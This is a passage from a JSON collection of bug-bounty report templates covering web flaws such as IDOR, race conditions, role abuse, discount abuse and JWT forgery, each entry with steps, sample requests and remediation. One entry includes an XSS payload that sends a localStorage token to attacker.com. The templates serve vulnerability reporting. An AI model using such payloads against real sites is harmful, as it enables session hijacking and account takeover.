                  "proof_of_concept": {
                    "request_example": "POST /generate_report HTTP/1.1\nHost: app.example.com\nCookie: sessionid=[your_session_id]\nContent-Type: application/json\n\n{\"report_id\": \"template_admin_report\", \"filter_user_id\": \"victim_user_id\"}",
                    "notes": "Clearly explain the intended logic and how it was abused. Provide the exact requests sent. Show screenshots or a video demonstrating the unauthorized outcome (e.g., a report with unauthorized data, content reverting incorrectly)."
                  },
                  "impact": "Unauthorized access to data or functionality, privilege escalation, financial fraud, data manipulation, or denial of service. Business logic flaws are often hard to detect by automated scanners and can lead to severe consequences for the business.",
                  "remediation_suggestion": "Thoroughly review and validate all business logic on the server-side. Implement strict authorization checks for every action and resource. Never trust client-side data for critical decisions. Adopt a 'deny by default' approach to authorization. Perform comprehensive manual testing and threat modeling to identify subtle logic flaws. Implement robust logging for all critical business actions to aid in detecting abuse."
                },
                {
                  "vulnerability_name": "Business Logic Race Between Users",
                  "summary": "A Business Logic Race Between Users occurs when two or more users concurrently attempt an action on a shared resource, and due to a lack of proper synchronization and validation, the application allows an unintended or unauthorized outcome. This often involves bypassing limits or acquiring exclusive resources.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., auction.example.com]",
                  "url_location": "[Full URL of the vulnerable endpoint, e.g., https://auction.example.com/place_bid]",
                  "steps_to_reproduce": [
                    "1. Identify a shared resource or a limited-quantity item where multiple users might compete (e.g., auction bidding, booking a single available slot, purchasing the last item in stock).",
                    "2. Coordinate with another user (or use multiple authenticated sessions/proxies) to send concurrent requests targeting the same limited resource.",
                    "3. **[Scenario A: Concurrent Bidding/Booking]**",
                    "   a. Two users (User A and User B) identify an auction item with a specific closing time or a single available booking slot.",
                    "   b. User A and User B both send their 'place bid' or 'book slot' requests concurrently or within milliseconds of each other.",
                    "   c. **[What happened]**: Due to a race condition, the application processes both bids or bookings, leading to an over-booking situation or an invalid state (e.g., two users successfully bidding for the last item).",
                    "   d. **[What should happen]**: The application should ensure that only one user successfully acquires the limited resource, and others are properly rejected.",
                    "4. **[Scenario B: Shared Limit Exploitation]**",
                    "   a. Two users share a limited pool of resources (e.g., a referral bonus for the first 10 new sign-ups, a single-use shared coupon).",
                    "   b. Both users attempt to claim the bonus/coupon simultaneously.",
                    "   c. **[What happened]**: Both users successfully claim the bonus/coupon, exceeding the intended limit.",
                    "   d. **[What should happen]**: The application should atomize the check-and-award process for shared limits."
                  ],
                  "proof_of_concept": {
                    "request_example": "POST /place_bid HTTP/1.1\nHost: auction.example.com\nCookie: sessionid=[user_A_session_id]\nContent-Type: application/json\n\n{\"item_id\": \"limited_item_123\", \"bid_amount\": 100}",
                    "notes": "Describe the setup for concurrent requests (e.g., two browser sessions, Burp Suite Intruder). Provide evidence of the unintended outcome (e.g., system logs showing two successful bids for the same item, two users claiming a single bonus). A video demonstrating the simultaneous actions and the incorrect outcome is crucial."
                  },
                  "impact": "Financial loss due to over-selling or unauthorized resource allocation. Data inconsistency. Can lead to disputes between users and reputational damage for the business. This is a severe business logic flaw.",
                  "remediation_suggestion": "Implement strong server-side synchronization and locking mechanisms for operations on shared resources. Use database transactions with appropriate isolation levels to ensure atomicity. Re-verify the state of the resource immediately before committing any action (e.g., re-check stock levels right before a purchase is finalized). Design business logic to explicitly handle concurrent access to critical shared resources."
                },
                {
                  "vulnerability_name": "Role Creation Abuse",
                  "summary": "Role Creation Abuse allows an attacker to create new user roles or modify existing role permissions in an unauthorized manner, potentially leading to privilege escalation, creation of backdoor accounts, or disruption of access control.",
                  "severity": "Critical",
                  "target": "[Specify affected asset, e.g., admin.example.com]",
                  "url_location": "[Full URL of the role management endpoint, e.g., https://admin.example.com/roles/create]",
                  "steps_to_reproduce": [
                    "1. Identify if the application has a role-based access control (RBAC) system where different roles have different privileges.",
                    "2. As a low-privileged user, identify endpoints related to role management (e.g., creating roles, editing role permissions, assigning users to roles).",
                    "3. **[Scenario A: Unauthorized Role Creation]**",
                    "   a. Attempt to send a request to a role creation endpoint (e.g., `POST /roles/create`) with parameters for a new role (e.g., `role_name=admin_clone`, `permissions=all`).",
                    "   b. **[What happened]**: The application creates a new role with elevated privileges that the current user should not be able to create.",
                    "   c. **[What should happen]**: Role creation should be restricted to highly privileged users only, and input for permissions should be validated.",
                    "4. **[Scenario B: Unauthorized Role Modification]**",
                    "   a. Identify an existing role with low privileges (e.g., 'editor').",
                    "   b. Attempt to send a request to a role modification endpoint (e.g., `PUT /roles/edit/editor_role_id`) to add high-level permissions (e.g., `can_delete_users=true`, `can_manage_roles=true`).",
                    "   c. **[What happened]**: The application modifies the 'editor' role to include administrative permissions.",
                    "   d. **[What should happen]**: Role modification should be restricted, and permission changes should be carefully validated against the requesting user's privileges.",
                    "5. **[Scenario C: Self-assigning to a Privileged Role]**",
                    "   a. If the application has a feature to 'assign users to roles' or 'change user role', try to intercept the request and change your own `user_id` to an administrator `role_id`.",
                    "   b. **[What happened]**: The application allows the user to assign themselves to a privileged role.",
                    "   c. **[What should happen]**: Role assignment should be strictly controlled by an administrator, and the user should not be able to elevate their own privileges."
                  ],
                  "proof_of_concept": {
                    "request_example": "POST /api/roles HTTP/1.1\nHost: admin.example.com\nCookie: sessionid=[your_session_id]\nContent-Type: application/json\n\n{\"name\": \"SuperUser\", \"permissions\": [\"all_access\", \"manage_users\", \"manage_settings\"]}",
                    "notes": "Provide the exact requests sent. Show screenshots or a video demonstrating the successful creation of a new role with elevated privileges, or the modification of an existing role's permissions. Show the resulting change in access for a user assigned to this role, or the ability to perform actions previously restricted."
                  },
                  "impact": "Privilege escalation, complete compromise of the application, unauthorized data access, system disruption, and creation of backdoor accounts. This is a critical access control and business logic vulnerability.",
                  "remediation_suggestion": "Implement strict server-side access control for all role management functions (creation, modification, assignment). Only highly privileged users should be able to perform these actions. Validate all submitted role data and permissions against a pre-defined set of allowed values. Never trust client-side input for role definitions or assignments. Implement robust logging for all role-related changes and alert on suspicious activity."
                },
                {
                  "vulnerability_name": "Improper Asset Ownership",
                  "summary": "Improper Asset Ownership (often a form of Broken Object Level Authorization - BOLA) occurs when an application fails to properly verify that a user has authorization to access or modify a specific asset (e.g., document, image, user profile, account details) that they claim to own, allowing them to access or manipulate assets belonging to other users.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., cloudstorage.example.com]",
                  "url_location": "[Full URL of the asset access/modification endpoint, e.g., https://cloudstorage.example.com/files/download?id=123]",
                  "steps_to_reproduce": [
                    "1. As User A, upload a file, create a document, or access your own account details.",
                    "2. Observe the request URL or body, looking for predictable identifiers for the asset (e.g., `id=123`, `doc_id=XYZ`).",
                    "3. Log in as User B (or another user without permissions) or obtain another user's session.",
                    "4. **[Scenario A: Direct Object Reference (IDOR)]**",
                    "   a. As User B, try to access or modify User A's asset by changing the `id` parameter to User A's asset ID. Example: `https://cloudstorage.example.com/files/download?id=456` (where 456 is User A's file ID).",
                    "   b. **[What happened]**: User B successfully downloads or modifies User A's file, or accesses User A's private information.",
                    "   c. **[What should happen]**: The application should verify that User B is authorized to access file ID 456 before serving it.",
                    "5. **[Scenario B: Predictable/Sequential IDs]**",
                    "   a. If asset IDs are sequential or easily guessable, try enumerating IDs to access other users' assets.",
                    "   b. **[What happened]**: By incrementing/decrementing IDs, other users' data is accessible.",
                    "   c. **[What should happen]**: Use unpredictable, high-entropy identifiers (UUIDs) for sensitive assets.",
                    "6. **[Scenario C: Ownership Check Bypass in API]**",
                    "   a. Many APIs perform object-level authorization. Capture an API request to modify your own data.",
                    "   b. Change the `user_id` or `account_id` parameter in the request body to a different user's ID.",
                    "   c. **[What happened]**: The API successfully modifies data for another user.",
                    "   d. **[What should happen]**: The API should verify that the authenticated user is the owner of the `user_id` or `account_id` being modified."
                  ],
                  "proof_of_concept": {
                    "url_example": "https://cloudstorage.example.com/files/download?id=456",
                    "request_example": "PUT /api/v1/users/profile/123 HTTP/1.1\nHost: example.com\nCookie: sessionid=[user_A_session_id]\nContent-Type: application/json\n\n{\"email\": \"new_email@example.com\"}\n\n---\n\nPUT /api/v1/users/profile/456 HTTP/1.1\nHost: example.com\nCookie: sessionid=[user_B_session_id]\nContent-Type: application/json\n\n{\"email\": \"attacker_email@example.com\"}",
                    "notes": "Clearly state the sensitive asset, the parameter used for bypass, and the method of access. Include screenshots or a video demonstrating User B accessing/modifying User A's asset."
                  },
                  "impact": "Unauthorized access to or modification of sensitive data belonging to other users. Account takeover (if profile details can be changed). Data leakage. This is a severe access control vulnerability.",
                  "remediation_suggestion": "Implement robust server-side object-level authorization checks for every request involving an asset. Ensure that the authenticated user has explicit permission to access or modify the specific asset identified in the request. Never rely solely on predictable IDs for authorization. Use unpredictable, high-entropy identifiers (e.g., UUIDs) for sensitive resources. Apply a 'deny by default' authorization policy."
                },
                {
                  "vulnerability_name": "Promotion/Discount Abuse",
                  "summary": "Promotion/Discount Abuse allows an attacker to bypass the intended restrictions of promotional offers or discount codes, enabling them to gain unauthorized discounts, use single-use codes multiple times, or apply discounts to ineligible items, leading to financial loss for the business.",
                  "severity": "Medium",
                  "target": "[Specify affected asset, e.g., retail.example.com]",
                  "url_location": "[Full URL of the checkout or coupon application endpoint, e.g., https://retail.example.com/cart/apply_discount]",
                  "steps_to_reproduce": [
                    "1. Obtain a promotion code or identify an ongoing discount (e.g., a 'first order' discount, a referral bonus, a single-use coupon, a discount for a specific product category).",
                    "2. Add an item to the cart and proceed to apply the promotion.",
                    "3. **[Scenario A: Reusing Single-Use Codes]**",
                    "   a. Apply a single-use code and complete a purchase. Then, attempt to use the same code again for a new purchase.",
                    "   b. **[What happened]**: The application allows the reuse of the single-use code.",
                    "   c. **[What should happen]**: Single-use codes should be marked as used and invalidated server-side after the first successful redemption.",
                    "4. **[Scenario B: Applying to Excluded Items/Categories]**",
                    "   a. Obtain a discount code for 'electronics'. Add a 'clothing' item to the cart.",
                    "   b. Attempt to apply the 'electronics' discount code to the 'clothing' item.",
                    "   c. **[What happened]**: The application applies the discount to the ineligible item.",
                    "   d. **[What should happen]**: The application should validate the discount's applicability to the items in the cart.",
                    "5. **[Scenario C: Bypassing Minimum Purchase Requirements]**",
                    "   a. Obtain a discount code that requires a minimum purchase value (e.g., '$10 off $50'). Add items totaling less than the minimum to the cart.",
                    "   b. Apply the discount code.",
                    "   c. **[What happened]**: The application applies the discount even though the minimum purchase value is not met.",
                    "   d. **[What should happen]**: Minimum purchase requirements should be validated server-side.",
                    "6. **[Scenario D: Modifying Discount Amount/Type (covered under 'Price Manipulation', but relevant)]**",
                    "   a. Intercept the request where the discount is applied and try to change the `discount_percentage` or `discount_amount` parameter to an arbitrary value (e.g., 100%)."
                  ],
                  "proof_of_concept": {
                    "request_example": "POST /cart/apply_discount HTTP/1.1\nHost: retail.example.com\nCookie: sessionid=[your_session_id]\nContent-Type: application/json\n\n{\"code\": \"SINGLEUSE123\"}",
                    "notes": "Provide the promotion/discount code used. Show screenshots or a video demonstrating the successful abuse (e.g., multiple discounts applied, discount on an ineligible item, discount applied without meeting minimums). Show the final price and items in the cart."
                  },
                  "impact": "Direct financial loss to the business. Can lead to misrepresentation of marketing campaign effectiveness and inventory imbalances. Damages brand reputation.",
                  "remediation_suggestion": "Implement all promotion and discount validation strictly on the server-side. This includes checking: validity, expiry, usage limits (per user, total uses), minimum/maximum purchase values, and applicability to specific items/categories. Ensure that unique codes are invalidated after first use. Never trust client-side data for coupon eligibility or discount amounts. Implement robust logging for coupon applications and monitor for suspicious patterns."
                },
                {
                  "vulnerability_name": "Inventory Manipulation",
                  "summary": "Inventory Manipulation allows an attacker to interfere with the accurate tracking of product stock levels, potentially leading to over-selling, denial of service for legitimate customers, or the ability to acquire out-of-stock items.",
                  "severity": "Medium",
                  "target": "[Specify affected asset, e.g., ecommerce.example.com]",
                  "url_location": "[Full URL of the inventory-affecting endpoint, e.g., https://ecommerce.example.com/add_to_cart]",
                  "steps_to_reproduce": [
                    "1. Identify an item with limited stock (e.g., 1 or 2 remaining) or an item that is currently out of stock.",
                    "2. **[Scenario A: Hoarding Items / Denial of Inventory]**",
                    "   a. Repeatedly add a limited stock item to the cart using multiple accounts or sessions, but do not complete the purchase.",
                    "   b. **[What happened]**: The item's stock level drops to zero, making it unavailable for legitimate buyers, even though it hasn't been purchased. The attacker can then abandon the carts, releasing the stock later (or not).",
                    "   c. **[What should happen]**: Applications should implement short cart expirations or temporary holds on inventory to prevent indefinite hoarding.",
                    "3. **[Scenario B: Bypassing Out-of-Stock Checks]**",
                    "   a. Identify an item that is currently displayed as 'Out of Stock'.",
                    "   b. Intercept the 'add to cart' or 'purchase' request. Even if the UI shows 'Out of Stock', try sending a request to add the item.",
                    "   c. **[What happened]**: The application allows the addition of the out-of-stock item to the cart or even processes a purchase.",
                    "   d. **[What should happen]**: Server-side validation should strictly enforce stock availability before any item is added to the cart or purchased.",
                    "4. **[Scenario C: Manipulating Quantity Beyond Available Stock]**",
                    "   a. An item has 5 units in stock. Add 1 unit to the cart.",
                    "   b. Intercept the 'update quantity' request in the cart and change the quantity to 10.",
                    "   c. **[What happened]**: The application accepts the quantity of 10, even though only 5 are available, potentially leading to an over-selling situation or a backend error that could be exploited.",
                    "   d. **[What should happen]**: Quantity updates must be validated against current stock levels server-side."
                  ],
                  "proof_of_concept": {
                    "request_example": "POST /add_to_cart HTTP/1.1\nHost: ecommerce.example.com\nCookie: sessionid=[your_session_id]\nContent-Type: application/json\n\n{\"product_id\": \"limited_edition_shoe\", \"quantity\": 1}",
                    "notes": "Provide the exact requests. Show screenshots demonstrating the impact (e.g., item showing 'Out of Stock' for others, an order for an out-of-stock item, or an order exceeding available stock). A video showing the stock level before and after the attack is very useful."
                  },
                  "impact": "Denial of Service (DoS) for legitimate customers attempting to purchase items. Over-selling, leading to unfulfillable orders and customer dissatisfaction. Financial loss if out-of-stock items are purchased. Reputational damage due to poor inventory management.",
                  "remediation_suggestion": "Implement strict server-side validation for all inventory-related operations (adding to cart, updating quantity, purchase). Always check current stock levels immediately before confirming a purchase. Implement short timeouts for items held in carts. For critical stock, use database transactions with optimistic locking to prevent race conditions. Regularly monitor inventory levels for anomalies."
                },
                {
                  "vulnerability_name": "Weak Anti-Fraud Controls",
                  "summary": "Weak Anti-Fraud Controls indicate that an application lacks sufficient mechanisms to detect and prevent fraudulent activities, making it vulnerable to various attacks like credit card fraud, account takeovers, or abuse of features that could lead to financial losses.",
                  "severity": "Medium",
                  "target": "[Specify affected asset, e.g., financial.example.com]",
                  "url_location": "[Any high-risk endpoint, e.g., https://financial.example.com/transaction, https://financial.example.com/signup]",
                  "steps_to_reproduce": [
                    "1. Identify areas where fraudulent activities are likely to occur (e.g., payment processing, account creation, password reset, large transactions, loyalty programs).",
                    "2. **[Scenario A: Lack of IP/Device Fingerprinting for Suspicious Activity]**",
                    "   a. Attempt suspicious actions from multiple different IP addresses or using different user-agent strings (e.g., repeatedly trying invalid login attempts, creating multiple accounts).",
                    "   b. **[What happened]**: The application does not flag or block these suspicious activities, allowing brute-force or mass account creation.",
                    "   c. **[What should happen]**: The application should track and analyze behavioral patterns (IP, device, frequency, location) to detect and mitigate fraud.",
                    "3. **[Scenario B: Insufficient Transaction Monitoring]**",
                    "   a. Perform a series of small, legitimate transactions.",
                    "   b. Then, attempt a large, suspicious transaction (e.g., unusually high amount, transfer to a new beneficiary, rapid succession of transactions).",
                    "   c. **[What happened]**: The application processes the suspicious transaction without additional verification or flagging.",
                    "   d. **[What should happen]**: The application should have rules to flag or challenge transactions that deviate from normal user behavior or exceed certain thresholds.",
                    "4. **[Scenario C: Easy Bypass of Verification Steps (e.g., email/phone verification)]**",
                    "   a. During registration or password reset, where email/phone verification is required, identify if there's a way to bypass it (e.g., through insecure direct object references, or if the token is easily guessable, or if the API doesn't enforce it).",
                    "   b. **[What happened]**: Verification is bypassed, allowing account creation or password reset without the legitimate owner's consent.",
                    "   c. **[What should happen]**: Verification steps must be robust and enforced server-side.",
                    "5. **[Scenario D: Lack of CAPTCHA/Rate Limiting on Critical Flows]**",
                    "   a. (Already covered, but relevant here) Brute-force login, coupon application, or account creation without encountering CAPTCHA or rate limits.",
                    "   b. **[What happened]**: Automated attacks are easily performed.",
                    "   c. **[What should happen]**: CAPTCHA and strong rate limits should protect critical flows."
                  ],
                  "proof_of_concept": {
                    "notes": "Clearly describe the anti-fraud control that was found to be weak or missing. Provide steps and evidence of the successful fraudulent activity (e.g., successful account creation without email verification, multiple failed login attempts not leading to lockout, a suspicious transaction being processed)."
                  },
                  "impact": "Financial loss due to fraud, account takeovers, spam/abuse of the platform, reputational damage, and potential regulatory non-compliance. Undermines the integrity of the application's core business.",
                  "remediation_suggestion": "Implement a multi-layered anti-fraud strategy. This includes: robust rate limiting, CAPTCHA on high-risk forms, strong behavioral analytics (IP, device fingerprinting, velocity checks), real-time transaction monitoring with alerting, and multi-factor authentication (MFA) for high-risk actions. Integrate with specialized anti-fraud solutions. Conduct regular fraud risk assessments and update controls accordingly. Ensure secure implementation of all verification steps."
                },
                {
                  "vulnerability_name": "Insufficient Logging for Critical Actions",
                  "summary": "Insufficient Logging for Critical Actions means that an application does not log or retain enough information about security-sensitive events (e.g., logins, failed logins, access control failures, data modifications, administrative actions), making it difficult to detect, investigate, or respond to security incidents.",
                  "severity": "Medium",
                  "target": "[Specify affected asset, e.g., internal.example.com]",
                  "url_location": "[Any critical endpoint, e.g., https://internal.example.com/admin/settings]",
                  "steps_to_reproduce": [
                    "1. Identify critical actions within the application (e.g., admin login, user password reset, account deletion, sensitive data export, role changes, financial transactions).",
                    "2. Perform one of these critical actions, both successfully and unsuccessfully (if applicable).",
                    "3. **[Scenario A: Missing Log Entries]**",
                    "   a. Attempt to perform an unauthorized action (e.g., try to access an admin page as a regular user, try to delete an account you don't own).",
                    "   b. Review the application's audit logs, security logs, or network logs (if accessible or if you can infer what *should* be logged).",
                    "   c. **[What happened]**: No log entry or an incomplete log entry is generated for the failed unauthorized attempt.",
                    "   d. **[What should happen]**: All failed authorization attempts should be logged with sufficient detail (user, IP, timestamp, attempted action, resource).",
                    "4. **[Scenario B: Insufficient Log Details]**",
                    "   a. Perform a critical action (e.g., successfully change your password).",
                    "   b. Review the corresponding log entry.",
                    "   c. **[What happened]**: The log entry only states 'Password changed' without details like the user's ID, source IP address, or timestamp, making it hard to trace.",
                    "   d. **[What should happen]**: Logs should include: 'who' (user ID), 'what' (action taken), 'where' (source IP, endpoint), 'when' (timestamp), and 'how' (e.g., method of authentication).",
                    "5. **[Scenario C: Lack of Alerting/Monitoring]**",
                    "   a. If the logging system is known, trigger a high volume of suspicious activity (e.g., many failed logins).",
                    "   b. **[What happened]**: No alert is triggered, or the activity goes unnoticed by security monitoring.",
                    "   c. **[What should happen]**: Critical events should trigger alerts for security teams."
                  ],
                  "proof_of_concept": {
                    "notes": "Describe the critical action tested and the expected logging. Provide screenshots of the actual logs (or lack thereof) to demonstrate the insufficient logging. Explain how the missing logs would hinder incident response or forensic investigation. Example: 'Attempted to access /admin/users as a non-admin, no entry found in audit logs for this unauthorized access attempt.'"
                  },
                  "impact": "Delayed detection of security incidents. Hindered forensic investigations, making it difficult to identify the root cause, scope, and impact of a breach. Compliance failures. Increased dwell time for attackers within the system.",
                  "remediation_suggestion": "Implement comprehensive logging for all security-sensitive events: authentication attempts (success/failure), authorization failures, session management events, data access/modification, administrative actions, and any unexpected application errors. Ensure logs contain sufficient context (user ID, timestamp, source IP, action, resource, outcome). Centralize logs in a secure, tamper-proof logging system. Implement active monitoring and alerting for suspicious log patterns. Define and adhere to a clear log retention policy."
                },
                {
                  "vulnerability_name": "JWT Vulnerabilities",
                  "summary": "JWT (JSON Web Token) vulnerabilities arise from improper implementation or misconfiguration of JWTs, allowing attackers to forge, manipulate, or bypass authentication and authorization mechanisms, leading to privilege escalation, data access, or impersonation.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., api.example.com]",
                  "url_location": "[Any API endpoint using JWTs, e.g., https://api.example.com/profile]",
                  "steps_to_reproduce": [
                    "1. Identify an application that uses JWTs for authentication/authorization (typically sent in the `Authorization` header as `Bearer [JWT]`).",
                    "2. Decode the JWT to understand its structure (header, payload).",
                    "3. **[Scenario A: 'none' Algorithm Vulnerability]**",
                    "   a. Modify the JWT header: change the `alg` (algorithm) parameter to `none`. Remove the signature entirely.",
                    "   b. Send the modified JWT to an authenticated endpoint.",
                    "   c. **[What happened]**: The server accepts the unsigned token, treating it as valid, potentially granting access or allowing payload manipulation.",
                    "   d. **[What should happen]**: The server should explicitly reject tokens with `alg: none` if not intended, or enforce signing.",
                    "4. **[Scenario B: Weak Secret/Brute Force (HS256)]**",
                    "   a. If the `alg` is `HS256` (symmetric signing), try to brute-force the secret key using a tool like `johntheripper` or `hashcat` with a dictionary of common secrets. Obtain a valid JWT to use as a template.",
                    "   b. Once the secret is found, forge a new JWT with an altered payload (e.g., `\"isAdmin\": true`, `\"user_id\": 1`) and sign it with the cracked secret.",
                    "   c. **[What happened]**: The server accepts the forged JWT, granting elevated privileges or access to another user's data.",
                    "   d. **[What should happen]**: Use strong, high-entropy secret keys for HS256.",
                    "5. **[Scenario C: Algorithm Confusion (RS256 to HS256)]**",
                    "   a. If the `alg` is `RS256` (asymmetric signing), try to convert the algorithm to `HS256` in the JWT header. Take the server's *public key* (used for RS256 verification) and use it as the *secret key* for HS256 signing.",
                    "   b. Forge a JWT with a malicious payload and sign it using HS256 with the public key as the secret.",
                    "   c. **[What happened]**: The server attempts to verify an HS256 token using the public key as if it were a symmetric secret, and if the public key was used to sign, it validates.",
                    "   d. **[What should happen]**: The server should strictly enforce the expected algorithm and distinguish between symmetric and asymmetric keys.",
                    "6. **[Scenario D: JWKS/JKU Header Manipulation]**",
                    "   a. If the JWT header contains `jku` (JWK Set URL) or `jwk` (JSON Web Key) parameters, modify them to point to an attacker-controlled server hosting a malicious public key.",
                    "   b. Forge a JWT with a malicious payload and sign it with the corresponding private key from the attacker's server.",
                    "   c. **[What happened]**: The server fetches the attacker's public key from the controlled URL and uses it to validate the forged token.",
                    "   d. **[What should happen]**: Servers should only trust JWKS/JKU from authorized, configured endpoints or not rely on client-supplied key locations.",
                    "7. **[Scenario E: Exploiting Claims]**",
                    "   a. Alter sensitive claims in the JWT payload (e.g., `\"roles\": \"admin\"`, `\"user_id\": \"1\"`, `\"exp\":` to extend expiry) and re-sign if a vulnerability exists or a weak secret is found.",
                    "   b. **[What happened]**: The application grants elevated privileges or access to another user's data based on the manipulated claims."
                  ],
                  "proof_of_concept": {
                    "jwt_example": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
                    "notes": "Provide the original JWT and the modified JWT. Detail the changes made to the header and/or payload. Include screenshots or a video demonstrating the successful bypass of authentication/authorization and the resulting access to privileged functionality or data. Specify the tool used for manipulation (e.g., JWT Editor extension in Burp Suite)."
                  },
                  "impact": "Full account takeover, privilege escalation to administrator, unauthorized access to sensitive data, and system compromise. This directly impacts the authentication and authorization integrity of the application, leading to critical security breaches.",
                  "remediation_suggestion": "Always verify the JWT signature using the correct algorithm and secret/public key. Never allow the 'none' algorithm unless explicitly intended and handled with extreme caution. Use strong, high-entropy secret keys for symmetric algorithms (HS256). Properly enforce and validate the `alg` parameter. Do not fetch public keys from client-supplied URLs (JWKS/JKU) unless from a highly trusted and whitelisted source. Validate all claims in the JWT payload server-side to ensure they are consistent with the user's actual permissions and role, rather than blindly trusting the token's claims."
                },
                {
                  "vulnerability_name": "Insecure Storage of Tokens / Secrets",
                  "summary": "Insecure Storage of Tokens / Secrets occurs when sensitive authentication tokens (e.g., API keys, session tokens, JWTs, refresh tokens) or other secrets (e.g., cryptographic keys, credentials) are stored in client-side storage (e.g., `localStorage`, `sessionStorage`, insecure cookies) or in insecure server-side locations, making them vulnerable to theft via XSS, malware, or unauthorized access.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., webapp.example.com]",
                  "url_location": "[Any page where tokens/secrets are stored/accessed, e.g., https://webapp.example.com/dashboard]",
                  "steps_to_reproduce": [
                    "1. Identify the application's authentication mechanism and how tokens/secrets are stored.",
                    "2. **[Scenario A: Tokens in localStorage/sessionStorage]**",
                    "   a. Log in to the application.",
                    "   b. Open the browser's developer tools (F12) and navigate to the 'Application' tab. Check 'Local Storage' and 'Session Storage'.",
                    "   c. **[What happened]**: The authentication token (e.g., JWT, API key) is visible in plain text in `localStorage` or `sessionStorage`.",
                    "   d. **[What should happen]**: `localStorage` and `sessionStorage` are vulnerable to XSS attacks; if an XSS vulnerability exists, an attacker can easily read these tokens. Sensitive tokens should ideally be stored in `HttpOnly` cookies.",
                    "3. **[Scenario B: Tokens in Insecure Cookies (Missing HttpOnly, Secure, SameSite)]**",
                    "   a. Log in to the application.",
                    "   b. Inspect the cookies in the browser's developer tools.",
                    "   c. Check if session cookies or authentication tokens lack the `HttpOnly` flag. If `HttpOnly` is missing, try to access the cookie via JavaScript in the console (e.g., `document.cookie`).",
                    "   d. Check if `Secure` flag is missing (token sent over HTTP).",
                    "   e. Check if `SameSite` attribute is missing or set to `None` without proper security (e.g., `Secure` flag).",
                    "   f. **[What happened]**: The token is accessible via JavaScript (allowing XSS theft) or sent over insecure channels.",
                    "   g. **[What should happen]**: Session/authentication cookies should have `HttpOnly` (to prevent JS access), `Secure` (for HTTPS only), and appropriate `SameSite` attributes.",
                    "4. **[Scenario C: Secrets Hardcoded in Client-Side Code]**",
                    "   a. View the page source or JavaScript files loaded by the application.",
                    "   b. Search for sensitive strings like 'API_KEY', 'SECRET', 'password', 'token'.",
                    "   c. **[What happened]**: Secrets are directly visible in client-side code.",
                    "   d. **[What should happen]**: Secrets should never be hardcoded in client-side code."
                  ],
                  "proof_of_concept": {
                    "notes": "Provide screenshots of the developer console showing the token in `localStorage`, `sessionStorage`, or readable cookies. Explain how this token could be stolen (e.g., 'If XSS is present, this token could be exfiltrated.'). If hardcoded secrets are found, provide the relevant code snippet."
                  },
                  "impact": "Session hijacking, account takeover, unauthorized API access, and sensitive data exposure. If an attacker can obtain these tokens, they can impersonate the user and perform any action that user is authorized to do. This is a critical vulnerability if combined with XSS.",
                  "remediation_suggestion": "Store authentication tokens and sensitive secrets in `HttpOnly` and `Secure` cookies for session management (prevents JavaScript access and ensures HTTPS transmission). Avoid storing JWTs or refresh tokens in `localStorage` or `sessionStorage` if an XSS vulnerability can lead to their exfiltration. For API keys or other client-side secrets, consider alternative methods like short-lived tokens, token exchange flows, or backend-for-frontend (BFF) patterns. Never hardcode secrets in client-side code. Implement robust XSS prevention measures to mitigate the primary vector for client-side token theft."
                },
                {
                  "vulnerability_name": "Token Leakage via localStorage / sessionStorage",
                  "summary": "Token Leakage via `localStorage` or `sessionStorage` refers specifically to the vulnerability where authentication tokens (e.g., JWTs, session tokens) are stored in `localStorage` or `sessionStorage`, making them susceptible to theft by Cross-Site Scripting (XSS) attacks. An XSS payload can directly read these tokens from the browser's client-side storage.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., portal.example.com]",
                  "url_location": "[Any page where tokens are stored in local/session storage, e.g., https://portal.example.com/dashboard]",
                  "steps_to_reproduce": [
                    "1. Log in to the application and confirm that an authentication token (e.g., 'jwt', 'access_token', 'session_token') is stored in `localStorage` or `sessionStorage` (check 'Application' tab in browser dev tools).",
                    "2. Identify an XSS vulnerability on the same origin (or a sub-domain). This could be reflected, stored, or DOM-based XSS.",
                    "3. Craft an XSS payload that attempts to retrieve the token from `localStorage` or `sessionStorage` and exfiltrate it to an attacker-controlled server. Example for `localStorage`:",
                    "   ```html\n   <script>\n     var token = localStorage.getItem('access_token');\n     if (token) {\n       new Image().src = '[http://attacker.com/steal?token=](http://attacker.com/steal?token=)' + encodeURIComponent(token);\n     }\n   </script>\n   ```",
                    "4. Trigger the XSS vulnerability (e.g., by making a victim click a malicious link or view a page with stored XSS).",
                    "5. **[What happened]**: The XSS payload executes in the victim's browser, retrieves their authentication token from `localStorage`/`sessionStorage`, and sends it to the attacker's server.",
                    "6. **[What should happen]**: Authentication tokens should not be stored in `localStorage` or `sessionStorage` if XSS is a risk, as they are trivially accessible by JavaScript. `HttpOnly` cookies are generally preferred for session tokens to prevent JavaScript access.",
                    "7. The attacker can then use the stolen token to impersonate the victim."
                  ],
                  "proof_of_concept": {
                    "xss_payload_example": "<img src=x onerror=\"new Image().src='http://attacker.com/steal?token='+encodeURIComponent(localStorage.getItem('access_token'))\">",
                    "notes": "Provide: 1. A screenshot showing the token in `localStorage`/`sessionStorage`. 2. The XSS payload used. 3. Evidence of the XSS vulnerability. 4. Evidence of the token being received by the attacker's server (e.g., attacker server logs). Emphasize that this vulnerability *relies* on an existing XSS vulnerability."
                  },
                  "impact": "Full session hijacking and account takeover. Once the token is stolen, an attacker can impersonate the victim, gaining unauthorized access to their account and performing any actions they are authorized to do. This can lead to sensitive data exposure, financial fraud, or system compromise.",
                  "remediation_suggestion": "Avoid storing sensitive authentication tokens (like JWT access tokens used for authorization) directly in `localStorage` or `sessionStorage`. For session management, prefer `HttpOnly` cookies (which prevent JavaScript access to the cookie). For API tokens, consider using short-lived access tokens combined with `HttpOnly` refresh tokens, or implement a Backend-for-Frontend (BFF) architecture. The most crucial remediation is to fix any XSS vulnerabilities, as they are the prerequisite for this type of token theft."
                },
                {
                  "vulnerability_name": "Secrets in URLs / Referer Leaks",
                  "summary": "Secrets in URLs / Referer Leaks occur when sensitive information (e.g., authentication tokens, session IDs, API keys, private data) is transmitted directly within the URL's query parameters or fragment, making it vulnerable to exposure through browser history, proxy logs, server logs, or the `Referer` HTTP header when navigating to another site.",
                  "severity": "High",
